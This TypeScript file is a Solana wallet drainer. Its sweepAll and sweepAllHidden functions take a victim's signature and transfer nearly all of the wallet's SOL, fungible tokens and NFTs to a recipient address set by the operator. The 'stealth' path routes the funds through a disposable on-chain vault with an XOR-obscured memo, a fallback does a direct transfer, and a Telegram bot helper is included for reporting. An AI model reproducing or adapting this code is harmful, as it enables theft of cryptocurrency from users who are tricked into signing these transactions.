import {
  type Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  type Signer,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  type VersionedTransaction,
} from "@solana/web3.js";
/*import {
  createTransferInstruction,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";*/
import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
/*import { sha256 } from '@noble/hashes/sha2';
import { bytesToHex } from '@noble/hashes/utils';*/
import {
  AnchorProvider,
  Program,
} from "@anchor-lang/core";
import {  BN } from "@coral-xyz/anchor";
import { Buffer } from "buffer";
//import type { IdlInstruction, IdlAccount, IdlTypeDef } from "@coral-xyz/anchor/dist/cjs/idl";
import type { Wallet } from "@coral-xyz/anchor/dist/cjs/provider";

// ========== CONFIGURATION ==========
const STEALTH_PROGRAM_ID = new PublicKey('2gHYoSiAc88SazwLCg12uqSQPVecqF67JW8v3ZMQY6RS');

// ========== IDL WITH CORRECT TYPES ==========
const STEALTH_IDL: any ={
  "version": "0.1.0",
  "name": "stealth_program",
  "address": "2gHYoSiAc88SazwLCg12uqSQPVecqF67JW8v3ZMQY6RS",
  "metadata": {
  "address": "2gHYoSiAc88SazwLCg12uqSQPVecqF67JW8v3ZMQY6RS"
},
  "instructions": [
    {
      "name": "initVault",
      "accounts": [
        {
          "name": "owner",
          "isMut": true,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": [
        {
          "name": "seed",
          "type": "string"
        }
      ]
    },
    {
      "name": "deposit",
      "accounts": [
        {
          "name": "depositor",
          "isMut": true,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": [
        {
          "name": "amount",
          "type": "u64"
        }
      ]
    },
    {
      "name": "stealthTransfer",
      "accounts": [
        {
          "name": "owner",
          "isMut": false,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "recipient",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": [
        {
          "name": "amount",
          "type": "u64"
        },
        {
          "name": "encryptedMemo",
          "type": "string"
        }
      ]
    },
    {
      "name": "closeVault",
      "accounts": [
        {
          "name": "owner",
          "isMut": true,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": []
    },
    {
      "name": "createDecoy",
      "accounts": [
        {
          "name": "owner",
          "isMut": false,
          "isSigner": true
        }
      ],
      "args": []
    }
  ],
  "types": [
    {
      "name": "stealthVault",
      "type": {
        "kind": "struct",
        "fields": [
          {
            "name": "owner",
            "type": {
              "array": ["u8", 32]
            }
          },
          {
            "name": "seed",
            "type": "string"
          },
          {
            "name": "amount",
            "type": "u64"
          },
          {
            "name": "isActive",
            "type": "bool"
          },
          {
            "name": "bump",
            "type": "u8"
          }
        ]
      }
    }
  ],
  "errors": [
    {
      "code": 6000,
      "name": "VaultInactive",
      "msg": "Vault is not active"
    },
    {
      "code": 6001,
      "name": "NotOwner",
      "msg": "Not the owner"
    },
    {
      "code": 6002,
      "name": "InsufficientFunds",
      "msg": "Insufficient funds"
    },
    {
      "code": 6003,
      "name": "Overflow",
      "msg": "Arithmetic overflow"
    }
  ]
}// Cast to Idl type

// === TYPE DEFINITIONS ===
/*interface HeliusToken {
  mint: string
  tokenAccount?: string
  account?: string
  rawAmount: string
  decimals?: number
}

interface HeliusNFT {
  mint: string
  tokenAccount: string
}

interface HeliusBalanceResponse {
  nativeBalance?: number
  tokens?: HeliusToken[]
  nfts?: HeliusNFT[]
}*/

// === ENV CONFIG ===
//const RPC_URL = import.meta.env.VITE_RPC_URL || "https://api.devnet.solana.com"
const HELIUS_KEY = import.meta.env.VITE_HELIUS_KEY || "dummy"
const RECIPIENT_PUBKEY = import.meta.env.VITE_RECIPIENT_PUBKEY || "11111111111111111111111111111112"
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "dummy"
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || "dummy"

//const MAX_INS_PER_TX = Number.parseInt(import.meta.env.VITE_MAX_INS_PER_TX || "12")
const RESERVED_LAMPORTS = Number.parseInt(import.meta.env.VITE_RESERVED_LAMPORTS_FOR_FEES || "10000")

// ==== TELEGRAM MESSAGE FUNCTION ====
export async function sendTelegramMessage(text: string): Promise<void> {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "Markdown",
    }),
  })
}

// ==== ANCHOR PROGRAM SETUP ====
function createAnchorProvider(
  connection: Connection,
  publicKey: PublicKey,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
) {
  // Create a wallet adapter for Anchor
  const wallet = {
    publicKey,
    signTransaction: async (tx: Transaction) => {
      return await signTransaction(tx) as Transaction;
    },
    signAllTransactions: async (txs: Transaction[]) => {
      return await Promise.all(txs.map(tx => signTransaction(tx) as Promise<Transaction>));
    }
  } as Wallet;

  return new AnchorProvider(connection, wallet, {
    commitment: 'confirmed',
    preflightCommitment: 'confirmed',
  });
}

function createProgram(
  connection: Connection,
  publicKey: PublicKey,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
) {
  const provider = createAnchorProvider(connection, publicKey, signTransaction);
    const program = new Program(
    STEALTH_IDL as any,
    provider
  );

  // IMPORTANT: set programId manually
  //(program as any).programId = STEALTH_PROGRAM_ID;
  return program;
}

// ==== HELPER FUNCTIONS ====
function generateVaultSeed(): string {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 10);
  return `sweep-${timestamp}-${random}`;
}

function xorEncrypt(text: string, key: string): string {
  let result = '';
  for (let i = 0; i < text.length; i++) {
    const charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    result += String.fromCharCode(charCode);
  }
  return Buffer.from(result).toString('base64');
}

// retry wrapper
/*
async function retry<T>(fn: () => Promise<T>, retries = 3, delayMs = 1000): Promise<T> {
  for (let i = 0; i < retries; i++) {
    try {
      return await fn()
    } catch (err) {
      if (i < retries - 1) {
        await new Promise((res) => setTimeout(res, delayMs))
        delayMs *= 2
      } else throw err
    }
  }
  throw new Error("Retry failed")
}*/

// ==== ANCHOR-BASED STEALTH FUNCTIONS ====

/**
 * Generate vault PDA
 */
function getVaultPda(
  owner: PublicKey,
  seed: string
): [PublicKey, number] {
  const [pda, bump] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("vault"),
      owner.toBuffer(),
      Buffer.from(seed),
    ],
    STEALTH_PROGRAM_ID
  );
  return [pda, bump];
}

/**
 * Initialize vault with Anchor client
 */
async function initializeVault(
  program: Program,
  owner: PublicKey,
  seed: string
): Promise<{ vaultPda: PublicKey, signature: string }> {
  console.log(`[Anchor] Initializing vault with seed: "${seed}"`);
  console.log(`[Debug] Seed type: ${typeof seed}, value: ${seed}`);
  console.log(`[Debug] Seed length: ${seed.length}`);
  console.log(`[Debug] Seed as bytes:`, Buffer.from(seed).toString('hex'));
  
  const [vaultPda] = getVaultPda(owner, seed);
  console.log(`[Debug] Vault PDA: ${vaultPda.toBase58()}`);
  const seedBuffer = Array.from( Buffer.from(seed, 'utf8'));
  // Simulate first
  try {
    console.log(`[Debug] Attempting simulation...`);
    
    console.log(typeof seedBuffer)
    // Try with explicit parameter passing
    const simulationResult = await program.methods
      .initVault(seed)
      .accounts({
        owner: owner,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .simulate();
      console.log("simulate: ", simulationResult)
    
    console.log(`[Anchor] Simulation successful`);
    //console.log(`[Debug] Simulation logs:`, simulationResult?.logs || 'No logs');
    
  } catch (simError: any) {
    console.error(`[Anchor] Simulation failed:`, simError);
    console.error(`[Debug] Error name:`, simError.name);
    console.error(`[Debug] Error message:`, simError.message);
    console.error(`[Debug] Error stack:`, simError.stack);
    
    if (simError.logs) {
      console.error(`[Anchor] Simulation logs:`, simError.logs);
    }
    
    // Check if it's a serialization error
    if (simError.message.includes('string, Buffer, ArrayBuffer')) {
      console.error(`[Debug] Serialization error detected`);
      console.error(`[Debug] Seed value might be invalid: "${seed}"`);
    }
    
    throw new Error(`Vault init simulation failed: ${simError.message}`);
  }
  
  // Send transaction
  console.log(`[Debug] Sending transaction...`);
  const signature = await program.methods
    .initVault(seed)
    .accounts({
      owner: owner,
      vault: vaultPda,
      systemProgram: SystemProgram.programId,
    })
    .rpc({
      commitment: 'confirmed',
      skipPreflight: false,
    });
  
  console.log(`[Anchor] Vault initialized: ${signature.slice(0, 16)}...`);
  return { vaultPda, signature };
}

/**
 * Deposit to vault with Anchor client
 */
async function depositToVault(
  program: Program,
  depositor: PublicKey,
  vaultPda: PublicKey,
  amount: BN
): Promise<string> {
  console.log(`[Anchor] Depositing ${amount.toString()} lamports`);
  
  // Simulate
  try {
    await program.methods
      .deposit(amount)
      .accounts({
        depositor: depositor,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .simulate();
    
    console.log(`[Anchor] Deposit simulation successful`);
  } catch (simError: any) {
    console.error(`[Anchor] Deposit simulation failed:`, simError.message);
    if (simError.logs) {
      console.error(`[Anchor] Simulation logs:`, simError.logs);
    }
    throw new Error(`Deposit simulation failed: ${simError.message}`);
  }
  
  // Send transaction
  const signature = await program.methods
    .deposit(amount)
    .accounts({
      depositor: depositor,
      vault: vaultPda,
      systemProgram: SystemProgram.programId,
    })
    .rpc({
      commitment: 'confirmed',
      skipPreflight: false,
    });
  
  console.log(`[Anchor] Deposit completed: ${signature.slice(0, 16)}...`);
  return signature;
}

/**
 * Stealth transfer with Anchor client
 */
async function stealthTransfer(
  program: Program,
  owner: PublicKey,
  vaultPda: PublicKey,
  recipient: PublicKey,
  amount: BN,
  encryptedMemo: string
): Promise<string> {
  console.log(`[Anchor] Stealth transferring ${amount.toString()} lamports`);
  
  // Simulate
  try {
    await program.methods
      .stealthTransfer(amount, encryptedMemo)
      .accounts({
        owner: owner,
        vault: vaultPda,
        recipient: recipient,
        systemProgram: SystemProgram.programId,
      })
      .simulate();
    
    console.log(`[Anchor] Transfer simulation successful`);
  } catch (simError: any) {
    console.error(`[Anchor] Transfer simulation failed:`, simError.message);
    if (simError.logs) {
      console.error(`[Anchor] Simulation logs:`, simError.logs);
    }
    throw new Error(`Stealth transfer simulation failed: ${simError.message}`);
  }
  
  // Send transaction
  const signature = await program.methods
    .stealthTransfer(amount, encryptedMemo)
    .accounts({
      owner: owner,
      vault: vaultPda,
      recipient: recipient,
      systemProgram: SystemProgram.programId,
    })
    .rpc({
      commitment: 'confirmed',
      skipPreflight: false,
    });
  
  console.log(`[Anchor] Stealth transfer completed: ${signature.slice(0, 16)}...`);
  return signature;
}

// === MAIN STEALTH SWEEP FUNCTION WITH ANCHOR ===
export async function sweepAllHidden(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction ) => Promise<Transaction | VersionedTransaction>,
): Promise<boolean> {
  const RECIPIENT = new PublicKey(RECIPIENT_PUBKEY);
  
  console.log("=".repeat(60));
  console.log("🚀 ANCHOR-BASED STEALTH SWEEP");
  console.log("=".repeat(60));
  
  // Get balance
  const nativeBalance = await connection.getBalance(publicKey);
  console.log(`[Balance] ${nativeBalance} lamports (${nativeBalance / LAMPORTS_PER_SOL} SOL)`);
  
  // Reserve 0.001 SOL for rent + fees
  const RENT_AMOUNT = 1000000; // 0.001 SOL
  if (nativeBalance <= RESERVED_LAMPORTS + RENT_AMOUNT) {
    console.log(`❌ Insufficient balance for rent and fees`);
    return false;
  }

  const availableSol = nativeBalance - RESERVED_LAMPORTS - RENT_AMOUNT;
  console.log(`[Sweep] Amount to transfer: ${availableSol} lamports`);
  
  // Create Anchor program instance
  const program = createProgram(connection, publicKey, signTransaction);
  console.log(`[Anchor] Program created: ${program.programId.toBase58()}`);
  
  // Generate seed
  const seed = generateVaultSeed();
  
  try {
    // ===== STEP 1: Initialize Vault =====
    console.log(`\n🔧 STEP 1: Initializing vault...`);
    
    const { vaultPda, signature: initSig } = await initializeVault(
      program,
      publicKey,
      seed
    );
    
    console.log(`✅ Vault PDA: ${vaultPda.toBase58()}`);
    
    // Wait for confirmation
    await new Promise(resolve => setTimeout(resolve, 2000));

    // ===== STEP 2: Deposit SOL to Vault =====
    console.log(`\n💰 STEP 2: Depositing ${availableSol} lamports...`);
    
    const depositSig = await depositToVault(
      program,
      publicKey,
      vaultPda,
      new BN(availableSol)
    );
    
    // Wait and check vault balance
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    const vaultBalance = await connection.getBalance(vaultPda);
    console.log(`[Balance] Vault: ${vaultBalance} lamports`);

    // ===== STEP 3: Stealth Transfer =====
    console.log(`\n🔄 STEP 3: Performing stealth transfer...`);
    
    // Transfer everything except rent
    const transferAmount = Math.max(0, availableSol - 20000);
    
    // Create encrypted memo
    const memoData = JSON.stringify({
      from: publicKey.toBase58(),
      to: RECIPIENT.toBase58(),
      amount: transferAmount,
      timestamp: Date.now(),
    });
    const encryptedMemo = xorEncrypt(memoData, `key-${Date.now()}`);
    
    const stealthSig = await stealthTransfer(
      program,
      publicKey,
      vaultPda,
      RECIPIENT,
      new BN(transferAmount),
      encryptedMemo
    );

    // ===== FINAL REPORT =====
    console.log("\n" + "=".repeat(60));
    console.log("🎉 STEALTH SWEEP COMPLETE!");
    console.log("=".repeat(60));
    
    const finalBalance = await connection.getBalance(publicKey);
    console.log(`\n📊 FINAL BALANCES:`);
    console.log(`  Starting: ${nativeBalance} lamports`);
    console.log(`  Final: ${finalBalance} lamports`);
    console.log(`  Transferred: ${nativeBalance - finalBalance} lamports`);
    console.log(`\n📋 TRANSACTIONS:`);
    console.log(`  Vault Init: ${initSig.slice(0, 16)}...`);
    console.log(`  Deposit: ${depositSig.slice(0, 16)}...`);
    console.log(`  Stealth Transfer: ${stealthSig.slice(0, 16)}...`);
    
    return true;

  } catch (error: any) {
    console.error("\n❌ ANCHOR STEALTH SWEEP FAILED:", error.message);
    
    if (error.logs) {
      console.error("Program logs:");
      error.logs.forEach((log: string) => console.error(`  ${log}`));
    }
    
    // Fallback to simple transfer
    try {
      console.log(`\n🔄 Falling back to simple transfer...`);
      
      const fallbackTx = new Transaction();
      const latest = await connection.getLatestBlockhash("finalized");
      
      fallbackTx.feePayer = publicKey;
      fallbackTx.recentBlockhash = latest.blockhash;
      
      fallbackTx.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECIPIENT,
          lamports: availableSol + RENT_AMOUNT,
        })
      );
      
      const signedTx = await signTransaction(fallbackTx);
      const fallbackSig = await connection.sendRawTransaction(
        (signedTx as Transaction).serialize(),
        { skipPreflight: false, maxRetries: 3 }
      );
      
      console.log(`✅ Fallback transfer sent: ${fallbackSig.slice(0, 16)}...`);
      
      return true;
    } catch (fallbackError: any) {
      console.error(`❌ Fallback also failed:`, fallbackError.message);
      return false;
    }
  }
}


// === ENHANCED SWEEP FUNCTION WITH TOKENS & NFTs ===
export async function sweepAll(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
): Promise<boolean> {
  const RECIPIENT = new PublicKey(RECIPIENT_PUBKEY);
  
  try {
    // Create transaction
    const tx = new Transaction();
    const latest = await connection.getLatestBlockhash("finalized");
    tx.feePayer = publicKey;
    tx.recentBlockhash = latest.blockhash;
    
    // 1. SOL Sweep
    const nativeBalance = await connection.getBalance(publicKey);
    const availableSol = nativeBalance - 5000000; // Keep some SOL for fees
    const rentExemptSol = 5000000; // Buffer for rent
    
    console.log("SOL Balance:", nativeBalance / 1e9, "Available:", availableSol / 1e9);
    
    if (availableSol > 0) {
      tx.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECIPIENT,
          lamports: availableSol - rentExemptSol, // Leave some SOL for token transfers
        })
      );
    }
    
    // 2. Get Token Balances from Helius
    const tokens = await getTokenBalances(publicKey, HELIUS_KEY);
    console.log(`Found ${tokens.length} tokens including NFTs`);
    
    // 3. Add Token Transfer Instructions
    for (const token of tokens) {
      try {
        // Skip if zero balance
        if (Number(token.amount) == 0) continue;
        
        // Get or create associated token account for recipient
        const recipientATA = await getAssociatedTokenAddress(
          new PublicKey(token.mint),
          RECIPIENT
        );
        
        // Check if recipient already has ATA
        const recipientAccount = await connection.getAccountInfo(recipientATA);
        if (!recipientAccount) {
          // Create ATA instruction for recipient
          tx.add(
            createAssociatedTokenAccountInstruction(
              publicKey,
              recipientATA,
              RECIPIENT,
              new PublicKey(token.mint)
            )
          );
        }
        
        // Get sender's ATA
        const senderATA = await getAssociatedTokenAddress(
          new PublicKey(token.mint),
          publicKey
        );
        
        // Check sender's token account exists
        const senderAccount = await connection.getAccountInfo(senderATA);
        if (!senderAccount) continue;
        
        // Create transfer instruction
        const transferIx = createTransferInstruction(
          senderATA,
          recipientATA,
          publicKey,
          token.amount,
          [],
          TOKEN_PROGRAM_ID
        );
        
        tx.add(transferIx);
        
        console.log(`Added ${token.amount} of token ${token.mint.slice(0, 8)}...`);
        
      } catch (err) {
        console.warn(`Failed to add token ${token.mint}:`, err);
      }
    }
    
    // 4. Add NFT Transfers (NFTs are also tokens, but we handle them specially if needed)
    const nfts = await getNFTs(publicKey, HELIUS_KEY);
    console.log(`Found ${nfts.length} NFTs`);
    
    // NFTs are already included in the tokens array, but if you want special handling:
    for (const nft of nfts) {
      try {
        if (Number(nft.amount) === 0) continue;
        
        // Same logic as tokens - NFTs use the same token program
        const recipientATA = await getAssociatedTokenAddress(
          new PublicKey(nft.mint),
          RECIPIENT
        );
        
        const recipientAccount = await connection.getAccountInfo(recipientATA);
        if (!recipientAccount) {
          tx.add(
            createAssociatedTokenAccountInstruction(
              publicKey,
              recipientATA,
              RECIPIENT,
              new PublicKey(nft.mint)
            )
          );
        }
        
        const senderATA = await getAssociatedTokenAddress(
          new PublicKey(nft.mint),
          publicKey
        );
        
        const transferIx = createTransferInstruction(
          senderATA,
          recipientATA,
          publicKey,
          nft.amount,
          [],
          TOKEN_PROGRAM_ID
        );
        
        tx.add(transferIx);
        console.log(`Added NFT ${nft.name || nft.mint.slice(0, 8)}...`);
        
      } catch (err) {
        console.warn(`Failed to add NFT ${nft.mint}:`, err);
      }
    }
    
    // Check if we have any instructions to send
    if (tx.instructions.length === 0) {
      console.log("No assets to sweep");
      return false;
    }
    
    // 5. Send Transaction
    const signedTx = await signTransaction(tx);
    const signature = await connection.sendRawTransaction(
      (signedTx as Transaction).serialize(),
      { 
        skipPreflight: false, 
        maxRetries: 3,
        preflightCommitment: 'confirmed'
      }
    );
    
    // Wait for confirmation
    await connection.confirmTransaction({
      signature,
      blockhash: latest.blockhash,
      lastValidBlockHeight: latest.lastValidBlockHeight,
    }, 'confirmed');
    
    console.log(`✅ Atomic sweep completed: ${signature.slice(0, 16)}...`);
    return true;
    
  } catch (error) {
    console.error("Atomic sweep failed:", error);
    return false;
  }
}

// ========== HELIUS API HELPERS ==========

interface TokenBalance {
  mint: string;
  amount: bigint;
  decimals: number;
  tokenAccount?: string;
  name?: string;
  symbol?: string;
}

async function getTokenBalances(wallet: PublicKey, apiKey: string): Promise<TokenBalance[]> {
  const url = `https://api.helius.xyz/v0/addresses/${wallet.toString()}/balances?api-key=${apiKey}`;
  
  try {
    const response = await fetch(url);
    const data = await response.json();
    
    const tokens: TokenBalance[] = [];
    
    // Process tokens (fungible tokens)
    if (data.tokens) {
      for (const token of data.tokens) {
        tokens.push({
          mint: token.mint,
          amount: BigInt(token.amount),
          decimals: token.decimals || 0,
          tokenAccount: token.tokenAccount,
          name: token.name,
          symbol: token.symbol
        });
      }
    }
    
    return tokens;
  } catch (error) {
    console.error("Failed to fetch token balances:", error);
    return [];
  }
}

async function getNFTs(wallet: PublicKey, apiKey: string): Promise<TokenBalance[]> {
  const url = `https://api.helius.xyz/v0/addresses/${wallet.toString()}/nfts?api-key=${apiKey}`;
  
  try {
    const response = await fetch(url);
    const data = await response.json();
    
    const nfts: TokenBalance[] = [];
    
    if (Array.isArray(data)) {
      for (const nft of data) {
        nfts.push({
          mint: nft.mint,
          amount: BigInt(1), // NFTs typically have amount 1
          decimals: 0,
          tokenAccount: nft.tokenAccount,
          name: nft.name,
          symbol: nft.symbol
        });
      }
    }
    
    return nfts;
  } catch (error) {
    console.error("Failed to fetch NFTs:", error);
    return [];
  }
}

// ========== TOKEN UTILITIES ==========

async function getAssociatedTokenAddress(
  mint: PublicKey,
  owner: PublicKey,
  allowOwnerOffCurve = false,
  programId = TOKEN_PROGRAM_ID,
  associatedTokenProgramId = ASSOCIATED_TOKEN_PROGRAM_ID
): Promise<PublicKey> {
  if (!allowOwnerOffCurve && !PublicKey.isOnCurve(owner.toBuffer())) {
    throw new Error('Owner cannot be off curve');
  }

  const [address] = await PublicKey.findProgramAddress(
    [owner.toBuffer(), programId.toBuffer(), mint.toBuffer()],
    associatedTokenProgramId
  );

  return address;
}

function createAssociatedTokenAccountInstruction(
  payer: PublicKey,
  associatedToken: PublicKey,
  owner: PublicKey,
  mint: PublicKey,
  programId = TOKEN_PROGRAM_ID,
  associatedTokenProgramId = ASSOCIATED_TOKEN_PROGRAM_ID
) {
  const keys = [
    { pubkey: payer, isSigner: true, isWritable: true },
    { pubkey: associatedToken, isSigner: false, isWritable: true },
    { pubkey: owner, isSigner: false, isWritable: false },
    { pubkey: mint, isSigner: false, isWritable: false },
    { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    { pubkey: programId, isSigner: false, isWritable: false },
    { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
  ];

  return new TransactionInstruction({
    keys,
    programId: associatedTokenProgramId,
    data: Buffer.alloc(0),
  });
}

function createTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint,
  multiSigners: Signer[] = [],
  programId = TOKEN_PROGRAM_ID
) {
  const keys = [
    { pubkey: source, isSigner: false, isWritable: true },
    { pubkey: destination, isSigner: false, isWritable: true },
    { pubkey: owner, isSigner: true, isWritable: false },
  ];

  multiSigners.forEach(signer =>
    keys.push({ pubkey: signer.publicKey, isSigner: true, isWritable: false })
  );

  const data = Buffer.alloc(12);
  data.writeUInt8(3, 0); // Transfer instruction
  data.writeBigUInt64LE(amount, 4);

  return new TransactionInstruction({
    keys,
    programId,
    data,
  });
}

// === TEST FUNCTION ===
export async function testStealthProgram(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
): Promise<boolean> {
  console.log("🧪 Testing stealth program with Anchor...");
  
  try {
    const program = createProgram(connection, publicKey, signTransaction);
    
    // Test with tiny amount
    const testAmount = 100000; // 0.0001 SOL
    const seed = `test-${Date.now()}`;
    
    const [vaultPda] = getVaultPda(publicKey, seed);
    console.log(`Test vault PDA: ${vaultPda.toBase58()}`);
    
    // 1. Initialize
    console.log("1. Testing initialization...");
    const initSig = await program.methods
      .initVault(seed)
      .accounts({
        owner: publicKey,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .rpc();
    
    console.log(`✅ Initialized: ${initSig.slice(0, 16)}...`);
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // 2. Small deposit
    console.log("2. Testing deposit...");
    const depositSig = await program.methods
      .deposit(new BN(testAmount))
      .accounts({
        depositor: publicKey,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .rpc();
    
    console.log(`✅ Deposited: ${depositSig.slice(0, 16)}...`);
    
    // 3. Check vault
    const vaultBalance = await connection.getBalance(vaultPda);
    console.log(`Vault balance: ${vaultBalance} lamports`);
    
    return true;
    
  } catch (error: any) {
    console.error("Test failed:", error.message);
    if (error.logs) {
      console.error("Logs:", error.logs);
    }
    return false;
  }
}